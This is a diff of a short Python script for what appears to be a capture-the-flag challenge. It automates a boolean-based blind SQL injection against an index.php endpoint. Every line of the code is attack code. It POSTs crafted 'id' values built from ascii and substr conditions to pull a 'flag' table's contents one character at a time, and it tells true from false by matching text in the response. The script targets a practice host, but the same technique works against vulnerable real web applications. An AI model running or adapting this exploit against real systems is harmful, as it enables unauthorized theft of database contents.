@@ -1,36 +1,20 @@
 import requests
-import time
 
-url = "http://192.168.15.80:20005/index.php";
+url='http://f4b59740-c8e4-4653-a1fd-e2be614665d2.node4.buuoj.cn:81/index.php'
+result=''
 
-result = ""
-num = 0  # 用了来判断是不是flag已经拼完整了
-for i in range(1, 60):
-    time.sleep(0.2)
-
-    if num == 1:
+for l in range(1,43):
+    for i in range(32,128):
+        payload='if((ascii(substr((select(flag)from(flag)),%d,1))=%d),1,0)'%(l,i)
+        data={'id':payload}
+        res=requests.post(url,data=data)
+        #res.encoding=res.apparent_encoding
+        if 'girlfriend' in res.text:
+            result+=chr(i)
+            print(result)
+            break
+        if '}' in result:
+            break
+    if '}' in result:
         break
-
-    for j in range(32, 128):
-
-        payload = "if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)" % (i, j);
-        # print(str((i-1)*96+j-32)+":~"+payload+"~")
-
-        data = {
-            "id": payload,
-        }
-
-        r = requests.post(url, data=data)
-
-        r.encoding = r.apparent_encoding
-
-        if "Hello" in r.text:
-            x = chr(j)
-            result += str(x)
-            print(result)
-            break
-
-        if "}" in result:
-            print(result)
-            num = 1
-            break
+print(result)
